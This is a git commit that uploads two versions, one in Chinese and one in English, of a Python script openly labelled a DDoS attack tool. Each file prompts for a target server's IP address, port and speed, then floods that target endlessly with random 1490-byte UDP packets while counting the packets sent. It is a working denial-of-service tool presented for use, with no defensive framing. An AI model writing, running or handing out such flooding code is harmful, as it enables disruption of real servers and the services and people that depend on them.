188007818733dc015aba24edf2d235299eb95625
Zhouxuanyao2333 <154810236+Zhouxuanyao2333@users.noreply.github.com>
2024-06-04 21:51:47 +0800

    Add files via upload

---
+++ Dos Attack/Python DDOS Attack of Chinese.py
@@ -0,0 +1,47 @@
+import socket
+import time
+import random
+import threading
+import sys
+import os
+#code time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#attact
+print(" _____________________________________________________________________________________ ")
+print("╱                                                                                     ╲")
+print('''|     _ \        __ \  __ \               ___|           _)       |                    |
+|    |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|                  |
+|    ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |                    |
+|   _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|                  |        
+|          ____/                                            _|                         |          ''')
+print("|======================================================================================|")
+print("| PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON |")
+print("| Python Dos攻击脚本 Python Dos攻击脚本 Python Dos攻击脚本 Python Dos攻击脚本 Python Do|")
+print("|======================================================================================|")
+print("│                      脚本作者:周XY Zhouxuanyao233                                    |")
+print("│         作者github:Zhouxuanyao2333(https://github.com/Zhouxuanyao2333)               │")
+print("|严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者 |")
+print("|                    原理很简单准确的说这个应该是DOS脚本awa                            |")
+print("|          作者联系邮箱 Zhouxuanyao233@outlook.com wpsoffice88@qq.com                  |")
+print("╲_____________________________________________________________________________________╱")
+IP_address = input("请输入要攻击的服务器的IP地址:")
+TPS = int(input("请输入攻击端口:"))
+speed = int(input("请输入攻击速度(1-1000):"))
+
+print("OK开始闪击")
+os.system("clear")
+#变量设置
+sent = 0
+while True:
+    sock.sendto(bytes, (IP_address,TPS))
+    sent = sent + 1
+    print ("已攻击 %s 次到服务器的 %s 端口 %d"%(sent,IP_address,TPS))
+    time.sleep((1000-speed)/2000)
---
+++ Dos Attack/Python DDOS Attack of English.py
@@ -0,0 +1,46 @@
+import socket
+import time
+import random
+import threading
+import sys
+import os
+#code time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#attact
+print(" _____________________________________________________________________________________ ")
+print("╱                                                                                     ╲")
+print('''|     _ \        __ \  __ \               ___|           _)       |                    |
+|    |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|                  |
+|    ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |                    |
+|   _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|                  |        
+|          ____/                                            _|                         |          ''')
+print("|======================================================================================|")
+print("| PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON |")
+print("|======================================================================================|")
+print("│                        author:周XY Zhouxuanyao233                                    |")
+print("│          My github:Zhouxuanyao2333(https://github.com/Zhouxuanyao2333)               │")
+print("|严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者 |")
+print("|                    原理很简单准确的说这个应该是DOS脚本awa                            |")
+print("|             My E-mail Zhouxuanyao233@outlook.com wpsoffice88@qq.com                  |")
+print("╲_____________________________________________________________________________________╱")
+IP_address = input("Please enter the IP address of the server you want to attack:")
+TPS = int(input("Please enter the port of the server you want to attack:"))
+speed = int(input("Please enter the Attack speed(1-1000):"))
+
+print("OK is Attacking")
+os.system("clear")
+#变量设置
+sent = 0
+while True:
+    sock.sendto(bytes, (IP_address,TPS))
+    sent = sent + 1
+    print ("The server has been attacked  %s time for %s port %d"%(sent,IP_address,TPS))
+    time.sleep((1000-speed)/2000)
